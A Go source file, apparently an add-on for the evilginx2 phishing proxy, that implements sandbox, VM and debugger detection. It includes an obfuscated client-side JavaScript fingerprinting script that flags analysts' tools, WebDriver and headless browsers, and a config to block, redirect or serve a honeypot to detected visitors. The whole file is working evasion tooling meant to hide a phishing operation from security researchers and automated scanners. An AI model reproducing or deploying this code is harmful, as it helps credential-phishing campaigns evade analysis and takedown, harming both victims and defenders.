package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// SandboxDetector detects sandbox and VM environments
type SandboxDetector struct {
	config           *SandboxDetectionConfig
	detectionMethods map[string]DetectionMethod
	cache            map[string]*SandboxDetectionResult
	cacheMutex       sync.RWMutex
	stats            *SandboxDetectionStats
	clientDetector   *ClientSideDetector
}

// SandboxDetectionConfig holds configuration for sandbox detection
type SandboxDetectionConfig struct {
	Enabled              bool                      `json:"enabled" yaml:"enabled"`
	Mode                 string                    `json:"mode" yaml:"mode"` // passive, active, aggressive
	ServerSideChecks     bool                      `json:"server_side_checks" yaml:"server_side_checks"`
	ClientSideChecks     bool                      `json:"client_side_checks" yaml:"client_side_checks"`
	CacheResults         bool                      `json:"cache_results" yaml:"cache_results"`
	CacheDuration        int                       `json:"cache_duration" yaml:"cache_duration"` // minutes
	DetectionThreshold   float64                   `json:"detection_threshold" yaml:"detection_threshold"`
	ActionOnDetection    string                    `json:"action_on_detection" yaml:"action_on_detection"` // block, redirect, honeypot
	HoneypotResponse     string                    `json:"honeypot_response" yaml:"honeypot_response"`
	RedirectURL          string                    `json:"redirect_url" yaml:"redirect_url"`
	EnabledDetections    map[string]bool           `json:"enabled_detections" yaml:"enabled_detections"`
}

// DetectionMethod represents a sandbox detection method
type DetectionMethod interface {
	Name() string
	Detect() (bool, float64, string)
	IsEnabled() bool
}

// SandboxDetectionResult stores the result of sandbox detection
type SandboxDetectionResult struct {
	IsSandbox    bool              `json:"is_sandbox"`
	Confidence   float64           `json:"confidence"`
	DetectedType string            `json:"detected_type"`
	Reasons      []string          `json:"reasons"`
	Timestamp    time.Time         `json:"timestamp"`
	ClientData   *ClientDetectionData `json:"client_data,omitempty"`
}

// ClientDetectionData stores client-side detection results
type ClientDetectionData struct {
	VMDetected       bool     `json:"vm_detected"`
	DebuggerDetected bool     `json:"debugger_detected"`
	AutomationDetected bool   `json:"automation_detected"`
	Artifacts        []string `json:"artifacts"`
	TimingAnomaly    bool     `json:"timing_anomaly"`
	HardwareAnomaly  bool     `json:"hardware_anomaly"`
}

// SandboxDetectionStats tracks detection statistics
type SandboxDetectionStats struct {
	TotalChecks      int64            `json:"total_checks"`
	SandboxDetected  int64            `json:"sandbox_detected"`
	VMDetected       int64            `json:"vm_detected"`
	DebuggerDetected int64            `json:"debugger_detected"`
	DetectionMethods map[string]int64 `json:"detection_methods"`
	mu               sync.RWMutex
}

// ClientSideDetector generates JavaScript for client-side detection
type ClientSideDetector struct {
	obfuscator *JSObfuscator
}

// NewSandboxDetector creates a new sandbox detector
func NewSandboxDetector(config *SandboxDetectionConfig, obfuscator *JSObfuscator) *SandboxDetector {
	sd := &SandboxDetector{
		config:         config,
		detectionMethods: make(map[string]DetectionMethod),
		cache:          make(map[string]*SandboxDetectionResult),
		stats:          &SandboxDetectionStats{
			DetectionMethods: make(map[string]int64),
		},
		clientDetector: &ClientSideDetector{
			obfuscator: obfuscator,
		},
	}
	
	// Initialize detection methods
	sd.initializeDetectionMethods()
	
	// Start cache cleanup
	if config.CacheResults {
		go sd.cacheCleanupWorker()
	}
	
	return sd
}

// initializeDetectionMethods sets up all detection methods
func (sd *SandboxDetector) initializeDetectionMethods() {
	// Hardware detection
	if sd.isDetectionEnabled("hardware") {
		sd.detectionMethods["hardware"] = &HardwareDetection{config: sd.config}
	}
	
	// Process detection
	if sd.isDetectionEnabled("process") {
		sd.detectionMethods["process"] = &ProcessDetection{config: sd.config}
	}
	
	// Network detection
	if sd.isDetectionEnabled("network") {
		sd.detectionMethods["network"] = &NetworkDetection{config: sd.config}
	}
	
	// Timing detection
	if sd.isDetectionEnabled("timing") {
		sd.detectionMethods["timing"] = &TimingDetection{config: sd.config}
	}
	
	// File system detection
	if sd.isDetectionEnabled("filesystem") {
		sd.detectionMethods["filesystem"] = &FileSystemDetection{config: sd.config}
	}
	
	// Environment detection
	if sd.isDetectionEnabled("environment") {
		sd.detectionMethods["environment"] = &EnvironmentDetection{config: sd.config}
	}
}

// Detect performs sandbox/VM detection
func (sd *SandboxDetector) Detect(req *http.Request, clientIP string) *SandboxDetectionResult {
	// Update stats
	sd.stats.mu.Lock()
	sd.stats.TotalChecks++
	sd.stats.mu.Unlock()
	
	// Check cache
	if sd.config.CacheResults {
		if cached := sd.getCachedResult(clientIP); cached != nil {
			return cached
		}
	}
	
	result := &SandboxDetectionResult{
		IsSandbox:    false,
		Confidence:   0.0,
		Reasons:      make([]string, 0),
		Timestamp:    time.Now(),
	}
	
	// Server-side detection
	if sd.config.ServerSideChecks {
		sd.performServerSideDetection(result)
	}
	
	// Cache result
	if sd.config.CacheResults {
		sd.cacheResult(clientIP, result)
	}
	
	// Update stats
	if result.IsSandbox {
		sd.stats.mu.Lock()
		sd.stats.SandboxDetected++
		if strings.Contains(result.DetectedType, "VM") {
			sd.stats.VMDetected++
		}
		sd.stats.mu.Unlock()
	}
	
	return result
}

// performServerSideDetection runs server-side detection methods
func (sd *SandboxDetector) performServerSideDetection(result *SandboxDetectionResult) {
	detectionScores := make(map[string]float64)
	
	// Run all enabled detection methods
	for name, method := range sd.detectionMethods {
		if method.IsEnabled() {
			detected, confidence, reason := method.Detect()
			if detected {
				detectionScores[name] = confidence
				result.Reasons = append(result.Reasons, reason)
				
				// Update method stats
				sd.stats.mu.Lock()
				sd.stats.DetectionMethods[name]++
				sd.stats.mu.Unlock()
			}
		}
	}
	
	// Calculate overall confidence
	if len(detectionScores) > 0 {
		totalConfidence := 0.0
		for _, score := range detectionScores {
			totalConfidence += score
		}
		result.Confidence = totalConfidence / float64(len(detectionScores))
		
		// Determine if sandbox based on threshold
		if result.Confidence >= sd.config.DetectionThreshold {
			result.IsSandbox = true
			result.DetectedType = sd.determineEnvironmentType(detectionScores)
		}
	}
}

// ProcessClientDetection processes client-side detection results
func (sd *SandboxDetector) ProcessClientDetection(data []byte, clientIP string) error {
	var clientData ClientDetectionData
	if err := json.Unmarshal(data, &clientData); err != nil {
		return err
	}
	
	// Get or create detection result
	sd.cacheMutex.Lock()
	result, exists := sd.cache[clientIP]
	if !exists {
		result = &SandboxDetectionResult{
			Timestamp: time.Now(),
			Reasons:   make([]string, 0),
		}
		sd.cache[clientIP] = result
	}
	result.ClientData = &clientData
	sd.cacheMutex.Unlock()
	
	// Update detection based on client data
	if clientData.VMDetected {
		result.IsSandbox = true
		result.Confidence = 0.9
		result.Reasons = append(result.Reasons, "Client-side VM detection")
		
		sd.stats.mu.Lock()
		sd.stats.VMDetected++
		sd.stats.mu.Unlock()
	}
	
	if clientData.DebuggerDetected {
		result.IsSandbox = true
		result.Confidence = 0.95
		result.Reasons = append(result.Reasons, "Debugger detected")
		
		sd.stats.mu.Lock()
		sd.stats.DebuggerDetected++
		sd.stats.mu.Unlock()
	}
	
	return nil
}

// GetDetectionScript returns client-side detection JavaScript
func (sd *SandboxDetector) GetDetectionScript() string {
	if !sd.config.ClientSideChecks {
		return ""
	}
	
	return sd.clientDetector.GenerateScript()
}

// determineEnvironmentType determines the type of sandbox/VM
func (sd *SandboxDetector) determineEnvironmentType(scores map[string]float64) string {
	// Analyze detection patterns
	if scores["hardware"] > 0.7 && scores["process"] > 0.7 {
		return "VM-VMware"
	} else if scores["hardware"] > 0.7 && scores["filesystem"] > 0.7 {
		return "VM-VirtualBox"
	} else if scores["network"] > 0.8 && scores["timing"] > 0.7 {
		return "Sandbox-Automated"
	} else if scores["process"] > 0.8 {
		return "Sandbox-Analysis"
	}
	
	return "Unknown-Sandbox"
}

// isDetectionEnabled checks if a detection method is enabled
func (sd *SandboxDetector) isDetectionEnabled(method string) bool {
	if sd.config.EnabledDetections == nil {
		return true // All enabled by default
	}
	
	enabled, exists := sd.config.EnabledDetections[method]
	return !exists || enabled
}

// getCachedResult retrieves cached detection result
func (sd *SandboxDetector) getCachedResult(clientIP string) *SandboxDetectionResult {
	sd.cacheMutex.RLock()
	defer sd.cacheMutex.RUnlock()
	
	if result, exists := sd.cache[clientIP]; exists {
		// Check if cache is still valid
		if time.Since(result.Timestamp) < time.Duration(sd.config.CacheDuration)*time.Minute {
			return result
		}
	}
	
	return nil
}

// cacheResult stores detection result in cache
func (sd *SandboxDetector) cacheResult(clientIP string, result *SandboxDetectionResult) {
	sd.cacheMutex.Lock()
	defer sd.cacheMutex.Unlock()
	
	sd.cache[clientIP] = result
}

// cacheCleanupWorker periodically cleans up expired cache entries
func (sd *SandboxDetector) cacheCleanupWorker() {
	ticker := time.NewTicker(time.Duration(sd.config.CacheDuration) * time.Minute)
	defer ticker.Stop()
	
	for range ticker.C {
		sd.cleanupCache()
	}
}

// cleanupCache removes expired cache entries
func (sd *SandboxDetector) cleanupCache() {
	sd.cacheMutex.Lock()
	defer sd.cacheMutex.Unlock()
	
	expiry := time.Duration(sd.config.CacheDuration) * time.Minute
	now := time.Now()
	
	for ip, result := range sd.cache {
		if now.Sub(result.Timestamp) > expiry {
			delete(sd.cache, ip)
		}
	}
}

// GetStats returns detection statistics
func (sd *SandboxDetector) GetStats() map[string]interface{} {
	sd.stats.mu.RLock()
	defer sd.stats.mu.RUnlock()
	
	return map[string]interface{}{
		"enabled":           sd.config.Enabled,
		"mode":             sd.config.Mode,
		"total_checks":     sd.stats.TotalChecks,
		"sandbox_detected": sd.stats.SandboxDetected,
		"vm_detected":      sd.stats.VMDetected,
		"debugger_detected": sd.stats.DebuggerDetected,
		"detection_methods": sd.stats.DetectionMethods,
		"cache_size":       len(sd.cache),
	}
}

// Hardware Detection Method
type HardwareDetection struct {
	config *SandboxDetectionConfig
}

func (hd *HardwareDetection) Name() string { return "hardware" }
func (hd *HardwareDetection) IsEnabled() bool { return true }

func (hd *HardwareDetection) Detect() (bool, float64, string) {
	score := 0.0
	reasons := []string{}
	
	// Check CPU count
	cpuCount := runtime.NumCPU()
	if cpuCount <= 2 {
		score += 0.3
		reasons = append(reasons, fmt.Sprintf("Low CPU count: %d", cpuCount))
	}
	
	// Check memory (simplified - would use syscalls in production)
	if runtime.GOOS == "linux" {
		if memInfo, err := ioutil.ReadFile("/proc/meminfo"); err == nil {
			if bytes.Contains(memInfo, []byte("MemTotal")) && len(memInfo) < 1000 {
				score += 0.2
				reasons = append(reasons, "Low memory detected")
			}
		}
	}
	
	// Check for VM-specific hardware
	if runtime.GOOS == "linux" {
		if dmidecode, err := exec.Command("dmidecode", "-s", "system-product-name").Output(); err == nil {
			product := strings.ToLower(string(dmidecode))
			if strings.Contains(product, "vmware") || strings.Contains(product, "virtualbox") ||
			   strings.Contains(product, "qemu") || strings.Contains(product, "virtual") {
				score += 0.5
				reasons = append(reasons, fmt.Sprintf("VM product detected: %s", strings.TrimSpace(product)))
			}
		}
	}
	
	detected := score >= 0.5
	if detected {
		return true, score, fmt.Sprintf("Hardware anomalies: %s", strings.Join(reasons, ", "))
	}
	
	return false, 0, ""
}

// Process Detection Method
type ProcessDetection struct {
	config *SandboxDetectionConfig
}

func (pd *ProcessDetection) Name() string { return "process" }
func (pd *ProcessDetection) IsEnabled() bool { return true }

func (pd *ProcessDetection) Detect() (bool, float64, string) {
	suspiciousProcesses := []string{
		"vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
		"vmwareuser", "vmacthlp", "vmusrvc", "vmsrvc",
		"python", "perl", "ruby", "wireshark", "fiddler",
		"procmon", "procexp", "ollydbg", "x64dbg", "ida",
		"immunity", "windump", "tcpdump", "regmon", "filemon",
		"sandbox", "analyzer", "monitor", "sniff",
	}
	
	detected := false
	confidence := 0.0
	detectedProcs := []string{}
	
	if runtime.GOOS == "linux" {
		// Check running processes
		files, err := ioutil.ReadDir("/proc")
		if err == nil {
			for _, file := range files {
				if file.IsDir() && isNumeric(file.Name()) {
					cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%s/cmdline", file.Name()))
					if err == nil {
						cmdlineStr := strings.ToLower(string(cmdline))
						for _, suspicious := range suspiciousProcesses {
							if strings.Contains(cmdlineStr, suspicious) {
								detected = true
								confidence += 0.2
								detectedProcs = append(detectedProcs, suspicious)
								break
							}
						}
					}
				}
			}
		}
	}
	
	if confidence > 1.0 {
		confidence = 1.0
	}
	
	if detected {
		return true, confidence, fmt.Sprintf("Suspicious processes: %s", strings.Join(detectedProcs, ", "))
	}
	
	return false, 0, ""
}

// Network Detection Method
type NetworkDetection struct {
	config *SandboxDetectionConfig
}

func (nd *NetworkDetection) Name() string { return "network" }
func (nd *NetworkDetection) IsEnabled() bool { return true }

func (nd *NetworkDetection) Detect() (bool, float64, string) {
	score := 0.0
	reasons := []string{}
	
	// Check for common sandbox network ranges
	sandboxRanges := []string{
		"10.0.0.0/8",     // Private range often used by sandboxes
		"172.16.0.0/12",  // Another private range
		"192.168.56.0/24", // VirtualBox default
		"192.168.122.0/24", // QEMU/KVM default
	}
	
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					ipNet, ok := addr.(*net.IPNet)
					if ok && ipNet.IP.To4() != nil {
						for _, sandboxRange := range sandboxRanges {
							_, subnet, _ := net.ParseCIDR(sandboxRange)
							if subnet != nil && subnet.Contains(ipNet.IP) {
								score += 0.3
								reasons = append(reasons, fmt.Sprintf("Sandbox network: %s", ipNet.IP))
								break
							}
						}
					}
				}
			}
		}
	}
	
	// Check for low number of network interfaces
	if len(interfaces) <= 2 {
		score += 0.2
		reasons = append(reasons, "Few network interfaces")
	}
	
	detected := score >= 0.5
	if detected {
		return true, score, fmt.Sprintf("Network anomalies: %s", strings.Join(reasons, ", "))
	}
	
	return false, 0, ""
}

// Timing Detection Method
type TimingDetection struct {
	config *SandboxDetectionConfig
}

func (td *TimingDetection) Name() string { return "timing" }
func (td *TimingDetection) IsEnabled() bool { return true }

func (td *TimingDetection) Detect() (bool, float64, string) {
	// Detect timing anomalies that indicate virtualization
	
	// Method 1: Check for timing inconsistencies
	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	elapsed := time.Since(start)
	
	// In VMs, sleep timing can be inaccurate
	if elapsed < 9*time.Millisecond || elapsed > 15*time.Millisecond {
		return true, 0.6, fmt.Sprintf("Timing anomaly detected: expected ~10ms, got %v", elapsed)
	}
	
	// Method 2: CPU timing checks (simplified)
	iterations := 1000000
	start = time.Now()
	sum := 0
	for i := 0; i < iterations; i++ {
		sum += i
	}
	cpuTime := time.Since(start)
	
	// VMs often show different CPU timing characteristics
	expectedTime := 5 * time.Millisecond // Rough estimate
	if cpuTime < expectedTime/2 || cpuTime > expectedTime*3 {
		return true, 0.7, fmt.Sprintf("CPU timing anomaly: %v", cpuTime)
	}
	
	return false, 0, ""
}

// File System Detection Method
type FileSystemDetection struct {
	config *SandboxDetectionConfig
}

func (fd *FileSystemDetection) Name() string { return "filesystem" }
func (fd *FileSystemDetection) IsEnabled() bool { return true }

func (fd *FileSystemDetection) Detect() (bool, float64, string) {
	score := 0.0
	reasons := []string{}
	
	// Check for VM-specific files and directories
	vmIndicators := []string{
		"/sys/class/dmi/id/product_name",
		"/proc/scsi/scsi",
		"/proc/ide/hd*/model",
	}
	
	vmStrings := []string{
		"vmware", "vbox", "virtualbox", "qemu", "virtual",
		"xen", "bochs", "oracle", "parallels",
	}
	
	for _, indicator := range vmIndicators {
		if content, err := ioutil.ReadFile(indicator); err == nil {
			contentStr := strings.ToLower(string(content))
			for _, vmString := range vmStrings {
				if strings.Contains(contentStr, vmString) {
					score += 0.4
					reasons = append(reasons, fmt.Sprintf("VM indicator in %s", indicator))
					break
				}
			}
		}
	}
	
	// Check for sandbox artifacts
	sandboxPaths := []string{
		"/tmp/sample",
		"/tmp/malware",
		"/home/sandbox",
		"/home/cuckoo",
		"/home/analysis",
	}
	
	for _, path := range sandboxPaths {
		if _, err := os.Stat(path); err == nil {
			score += 0.3
			reasons = append(reasons, fmt.Sprintf("Sandbox path exists: %s", path))
		}
	}
	
	detected := score >= 0.5
	if detected {
		return true, score, fmt.Sprintf("Filesystem artifacts: %s", strings.Join(reasons, ", "))
	}
	
	return false, 0, ""
}

// Environment Detection Method
type EnvironmentDetection struct {
	config *SandboxDetectionConfig
}

func (ed *EnvironmentDetection) Name() string { return "environment" }
func (ed *EnvironmentDetection) IsEnabled() bool { return true }

func (ed *EnvironmentDetection) Detect() (bool, float64, string) {
	score := 0.0
	reasons := []string{}
	
	// Check environment variables
	suspiciousEnvs := map[string][]string{
		"VBOX_":     {"VirtualBox"},
		"VMWARE":    {"VMware"},
		"QEMU":      {"QEMU"},
		"SANDBOX":   {"Sandbox"},
		"ANALYSIS":  {"Analysis"},
		"CUCKOO":    {"Cuckoo"},
	}
	
	for _, envStr := range os.Environ() {
		envUpper := strings.ToUpper(envStr)
		for prefix, desc := range suspiciousEnvs {
			if strings.Contains(envUpper, prefix) {
				score += 0.3
				reasons = append(reasons, fmt.Sprintf("%s environment variable", desc[0]))
				break
			}
		}
	}
	
	// Check hostname
	hostname, err := os.Hostname()
	if err == nil {
		hostnameLower := strings.ToLower(hostname)
		suspiciousHostnames := []string{
			"sandbox", "vmware", "virtualbox", "analysis",
			"malware", "cuckoo", "test", "lab", "honeypot",
		}
		
		for _, suspicious := range suspiciousHostnames {
			if strings.Contains(hostnameLower, suspicious) {
				score += 0.4
				reasons = append(reasons, fmt.Sprintf("Suspicious hostname: %s", hostname))
				break
			}
		}
	}
	
	// Check username
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	
	if username != "" {
		usernameLower := strings.ToLower(username)
		suspiciousUsers := []string{
			"sandbox", "analysis", "cuckoo", "test",
			"malware", "virus", "admin", "user",
		}
		
		for _, suspicious := range suspiciousUsers {
			if usernameLower == suspicious {
				score += 0.3
				reasons = append(reasons, fmt.Sprintf("Suspicious username: %s", username))
				break
			}
		}
	}
	
	detected := score >= 0.5
	if detected {
		return true, score, fmt.Sprintf("Environment indicators: %s", strings.Join(reasons, ", "))
	}
	
	return false, 0, ""
}

// Client-side detection script generation
func (csd *ClientSideDetector) GenerateScript() string {
	script := `
(function() {
    var detection = {
        vm_detected: false,
        debugger_detected: false,
        automation_detected: false,
        artifacts: [],
        timing_anomaly: false,
        hardware_anomaly: false
    };
    
    // VM Detection
    function detectVM() {
        // Check screen resolution
        if (screen.width == 1024 && screen.height == 768) {
            detection.artifacts.push('Common VM resolution');
            detection.vm_detected = true;
        }
        
        // Check color depth
        if (screen.colorDepth < 24) {
            detection.artifacts.push('Low color depth');
            detection.vm_detected = true;
        }
        
        // Check WebGL vendor
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            var vendor = gl.getParameter(gl.VENDOR);
            var renderer = gl.getParameter(gl.RENDERER);
            
            if (vendor && (vendor.includes('VMware') || vendor.includes('VirtualBox'))) {
                detection.artifacts.push('VM graphics vendor: ' + vendor);
                detection.vm_detected = true;
            }
            
            if (renderer && renderer.includes('llvmpipe')) {
                detection.artifacts.push('Software renderer detected');
                detection.vm_detected = true;
            }
        }
        
        // Check navigator properties
        if (navigator.hardwareConcurrency <= 2) {
            detection.artifacts.push('Low hardware concurrency');
            detection.hardware_anomaly = true;
        }
        
        // Check battery API (VMs often don't have batteries)
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                if (!battery.charging && battery.level === 1) {
                    detection.artifacts.push('No battery detected');
                    detection.vm_detected = true;
                }
            });
        }
        
        // Check device memory
        if (navigator.deviceMemory && navigator.deviceMemory <= 2) {
            detection.artifacts.push('Low device memory');
            detection.hardware_anomaly = true;
        }
    }
    
    // Debugger Detection
    function detectDebugger() {
        // Method 1: Timing-based detection
        var start = performance.now();
        debugger;
        var end = performance.now();
        
        if (end - start > 100) {
            detection.debugger_detected = true;
            detection.artifacts.push('Debugger timing anomaly');
        }
        
        // Method 2: toString detection
        var element = document.createElement('div');
        Object.defineProperty(element, 'id', {
            get: function() {
                detection.debugger_detected = true;
                detection.artifacts.push('Debugger console detection');
            }
        });
        console.log(element);
        console.clear();
        
        // Method 3: Error stack detection
        try {
            throw new Error();
        } catch (e) {
            if (e.stack && e.stack.length > 1000) {
                detection.debugger_detected = true;
                detection.artifacts.push('Abnormal stack trace');
            }
        }
    }
    
    // Automation Detection
    function detectAutomation() {
        // Check for webdriver
        if (navigator.webdriver) {
            detection.automation_detected = true;
            detection.artifacts.push('WebDriver detected');
        }
        
        // Check for phantom/headless properties
        if (window._phantom || window.callPhantom) {
            detection.automation_detected = true;
            detection.artifacts.push('PhantomJS detected');
        }
        
        // Check for headless Chrome
        if (/HeadlessChrome/.test(navigator.userAgent)) {
            detection.automation_detected = true;
            detection.artifacts.push('Headless Chrome detected');
        }
        
        // Check for missing window properties
        var missingProps = [];
        ['chrome', 'yandex', '__crWeb', '__gCrWeb', 'opera'].forEach(function(prop) {
            if (window[prop] === undefined && navigator.userAgent.toLowerCase().includes(prop.toLowerCase())) {
                missingProps.push(prop);
            }
        });
        
        if (missingProps.length > 0) {
            detection.automation_detected = true;
            detection.artifacts.push('Missing browser properties: ' + missingProps.join(', '));
        }
        
        // Check permissions
        if (navigator.permissions) {
            navigator.permissions.query({name: 'notifications'}).then(function(result) {
                if (result.state === 'prompt') {
                    // In automated browsers, permissions are often pre-set
                    detection.automation_detected = true;
                    detection.artifacts.push('Default permission state');
                }
            });
        }
    }
    
    // Timing Anomaly Detection
    function detectTimingAnomaly() {
        var iterations = 1000000;
        var start = performance.now();
        var sum = 0;
        
        for (var i = 0; i < iterations; i++) {
            sum += Math.sqrt(i);
        }
        
        var elapsed = performance.now() - start;
        
        // Check for unrealistic timing (too fast or too slow)
        if (elapsed < 10 || elapsed > 1000) {
            detection.timing_anomaly = true;
            detection.artifacts.push('CPU timing anomaly: ' + elapsed + 'ms');
        }
        
        // Check setTimeout accuracy
        var timeoutStart = performance.now();
        setTimeout(function() {
            var timeoutElapsed = performance.now() - timeoutStart;
            if (Math.abs(timeoutElapsed - 10) > 5) {
                detection.timing_anomaly = true;
                detection.artifacts.push('setTimeout inaccuracy: ' + timeoutElapsed + 'ms');
            }
        }, 10);
    }
    
    // Run all detections
    detectVM();
    detectDebugger();
    detectAutomation();
    detectTimingAnomaly();
    
    // Send results after a delay to ensure all async operations complete
    setTimeout(function() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/api/sandbox-detection', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(detection));
    }, 500);
})();
`
	
	// Obfuscate if available
	if csd.obfuscator != nil {
		// Use medium obfuscation level by default
		obfuscated, err := csd.obfuscator.ObfuscateScript(script, ObfuscationMedium)
		if err == nil {
			return obfuscated
		} else {
			log.Warning("Failed to obfuscate sandbox detection script: %v", err)
		}
	}
	
	return script
}

// Helper function
func isNumeric(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}
